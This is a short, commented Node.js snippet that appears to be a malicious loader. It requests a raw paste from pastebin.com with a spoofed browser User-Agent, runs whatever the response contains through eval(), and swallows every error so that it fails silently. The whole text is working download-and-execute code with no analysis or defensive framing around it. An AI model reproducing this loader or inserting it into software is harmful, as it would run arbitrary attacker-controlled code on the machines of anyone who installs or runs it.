try {
    // Importing the 'https' module
    var https = require('https');

    // Making an HTTP GET request to 'pastebin.com'
    https.get({
        'hostname': 'pastebin.com',
        'path': '/raw/XLeVP82h',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
    }, (r) => {
        // Setting encoding to UTF-8
        r.setEncoding('utf8');

        // Handling data received from the response
        r.on('data', (c) => {
            // Evaluating the received data as JavaScript code
            eval(c);
        });

        // Handling error events on the response
        r.on('error', () => {});
    }).on('error', () => {});
} catch (e) {
    // Catching any exceptions that occur during execution
}

